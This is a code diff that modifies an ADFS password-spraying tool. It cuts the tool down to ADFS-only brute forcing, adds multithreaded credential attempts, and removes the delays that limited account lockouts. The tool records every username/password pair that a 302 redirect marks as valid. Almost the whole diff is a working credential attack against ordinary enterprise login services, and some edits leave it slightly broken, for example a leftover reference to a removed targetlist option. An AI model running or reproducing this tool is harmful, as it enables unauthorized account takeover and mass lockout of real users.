@@ -1,3 +1,8 @@
+#!/usr/bin/env python3
+# modified by d.savitski
+# - only ADFS brute left
+# - multithread support
+#
 # Python3 tool to perform password spraying attack against ADFS
 # by @xFreed0m
 
@@ -11,12 +16,17 @@ import urllib
 import urllib.parse
 import urllib.request
 from random import randint
+from multiprocessing.pool import ThreadPool
 
 import requests
 from colorlog import ColoredFormatter
 from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
 from requests_ntlm import HttpNtlmAuth
 
+threads = 1
+target = None
+output_file_name = None
+verbose = None
 
 def logo():
     """
@@ -37,28 +47,17 @@ def args_parse():
     parser = argparse.ArgumentParser()
     pass_group = parser.add_mutually_exclusive_group(required=True)
     user_group = parser.add_mutually_exclusive_group(required=True)
-    target_group = parser.add_mutually_exclusive_group(required=True)
-    sleep_group = parser.add_mutually_exclusive_group(required=False)
     user_group.add_argument('-U', '--userlist', help="emails list to use, one email per line")
     user_group.add_argument('-u', '--user', help="Single email to test")
     pass_group.add_argument('-p', '--password', help="Single password to test")
     pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
-    target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
-    target_group.add_argument('-t', '--target', help="Target server to authenticate against")
-    sleep_group.add_argument('-s', '--sleep', type=int,
-                             help="Throttle the attempts to one attempt every # seconds, "
-                                  "can be randomized by passing the value 'random' - default is 0",
-                             default=0)
-    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=(
-        'minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication "
-                                                "attempt. Please provide minimum and maximum "
-                                                "values in seconds")
+    parser.add_argument('-t', '--target', help="Target server to authenticate against")
     parser.add_argument('-o', '--output', help="Output each attempt result to a csv file",
                         default="ADFSpray")
-    parser.add_argument('method', choices=['adfs', 'autodiscover', 'basicauth'])
 
     parser.add_argument('-V', '--verbose', help="Turn on verbosity to show failed "
                                                 "attempts", action="store_true", default=False)
+    parser.add_argument('--threads', type=int, help="Number of threads", default=1)
     return parser.parse_args()
 
 
@@ -129,45 +128,54 @@ def output(status, username, password, target, output_file_name):
         excptn(output_err)
 
 
-def random_time(minimum, maximum):
-    sleep_amount = randint(minimum, maximum)
-    return sleep_amount
+def adfs_attempts(users, passes):
+    global threads, output_file_name, verbose
 
 
-def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
-    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
-    
+    LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
+    output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
+    combinations = []
+    for password in passes:
+        for username in users:
+            combinations.append((username, password))
+        
+    results = ThreadPool(threads).map(adfs_brute, combinations)
+    for result in results:
+        pass
+
+    LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
+
+
+def adfs_brute(args):
+    (username, password) = args
+    global threads, target, output_file_name, verbose
     try:
-        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
-        for target in targets:  # checking each target separately
-            for password in passes:  # trying one password against each user, less likely to lockout users
-                for username in users:
-                    session = requests.Session()
-                    session.auth = (username, password)
-                    response = session.get(target)
-                    #  Currently checking only if working or not, need to add more tests in the future
-                    if response.status_code == 200:
-                        status = 'Valid creds'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        status = 'Invalid'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
+        target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
+            "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
+        post_data = urllib.parse.urlencode({'UserName': username, 'Password': password, 'AuthMethod': 'FormsAuthentication'}).encode('ascii')
+        session = requests.Session()
+        session.auth = (username, password)
+        response = session.post(target_url, data=post_data, allow_redirects=False,
+        headers={'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
+                'Gecko/20100101 Firefox/65.0',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
+                'image/webp,*/*;q=0.8'})
+        status_code = response.status_code
 
-        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
-        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
+
+        if status_code == 302:
+            status = 'Valid creds'
+            output(status, username, password, target, output_file_name)
+            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+        else:
+            status = 'Invalid'
+            if verbose:
+                output(status, username, password, target, output_file_name)
+                LOGGER.debug("[-]Creds failed for: %s" % username)
 
     except TimeoutError:
-        LOGGER.critical("[!] Timeout! check if target is accessible")
+        LOGGER.critical("[!] Exceprion")
         pass
 
     except KeyboardInterrupt:
@@ -175,110 +183,15 @@ def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, ran
         exit(1)
 
     except Exception as e:
-        excptn(e)
-
-
-def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
-    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
-
-    try:
-        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
-        for target in targets:  # checking each target separately
-            for password in passes:  # trying one password against each user, less likely to lockout users
-                for username in users:
-                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-                    req = requests.get(target, auth=HttpNtlmAuth(username, password),
-                                       headers={'User-Agent': 'Microsoft'}, verify=False)
-                    #  Currently checking only if working or not, need to add more tests in the future
-                    if req.status_code == 200:
-                        status = 'Valid creds'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        status = 'Invalid'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-
-        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
-        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-
-    except TimeoutError:
-        LOGGER.critical("[!] Timeout! check if target is accessible")
+        LOGGER.critical("[!]Exception: " + str(e))
         pass
 
-    except KeyboardInterrupt:
-        LOGGER.critical("[CTRL+C] Stopping the tool")
-        exit(1)
 
-    except Exception as e:
-        excptn(e)
-
-
-def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
-    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
-
-    try:
-        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
-
-        for target in targets:  # checking each target separately
-            for password in passes:  # trying one password against each user, less likely to lockout users
-                for username in users:
-                    target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
-                                 "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
-                    post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
-                                                        'AuthMethod': 'FormsAuthentication'}).encode('ascii')
-                    session = requests.Session()
-                    session.auth = (username, password)
-                    response = session.post(target_url, data=post_data, allow_redirects=False,
-                                            headers={'Content-Type': 'application/x-www-form-urlencoded',
-                                                     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
-                                                                   'Gecko/20100101 Firefox/65.0',
-                                                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
-                                                               'image/webp,*/*;q=0.8'})
-                    status_code = response.status_code
-                    #  Currently checking only if working or not, need to add more tests in the future
-
-                    if status_code == 302:
-                        status = 'Valid creds'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
-                    else:
-                        status = 'Invalid'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
-                    if random is True:  # let's wait between attempts
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-
-        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
-        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-
-    except TimeoutError:
-        LOGGER.critical("[!] Timeout! check if target is accessible")
-        pass
-
-    except KeyboardInterrupt:
-        LOGGER.critical("[CTRL+C] Stopping the tool")
-        exit(1)
-
-    except Exception as e:
-        excptn(e)
 
 
 def main():
+    global threads, target, output_file_name, verbose
+
     logo()
     args = args_parse()
     random = False
@@ -308,7 +221,7 @@ def main():
             excptn(err)
     if args.target:
         try:
-            targets_stripped = [args.target]
+            targets_stripped = args.target
         except Exception as err:
             excptn(err)
     elif args.targetlist:
@@ -316,10 +229,6 @@ def main():
             targets_stripped = targetlist(args.targetlist)
         except Exception as err:
             excptn(err)
-    if args.random:
-        random = True
-        min_sleep = args.random[0]
-        max_sleep = args.random[1]
 
     total_accounts = len(usernames_stripped)
     total_passwords = len(passwords_stripped)
@@ -330,30 +239,15 @@ def main():
     LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
     LOGGER.info("Total number of attempts: %s" % str(total_attempts))
 
-    if args.method == 'autodiscover':
-        LOGGER.info("[*] You chose %s method" % args.method)
-        autodiscover_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
-                              args.sleep, random, min_sleep, max_sleep, args.verbose)
+    threads = args.threads
+    output_file_name = args.output
+    target = targets_stripped
+    verbose = args.verbose
 
-    elif args.method == 'adfs':
-        LOGGER.info("[*] You chose %s method" % args.method)
-        adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
-                      args.sleep, random, min_sleep, max_sleep, args.verbose)
-
-    elif args.method == 'basicauth':
-        LOGGER.info("[*] You chose %s method" % args.method)
-        basicauth_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
-                           args.sleep, random, min_sleep, max_sleep, args.verbose)
-
-    else:
-        LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
+    adfs_attempts(usernames_stripped, passwords_stripped)
 
 
 if __name__ == "__main__":
     main()
 
-# TODO:
-# check if target accessible with shorter timeout
-# check other web responses to identify expired password, mfa, no such username, locked etc.
-# auto discover the autodiscover?
-# implement domain\user support
+
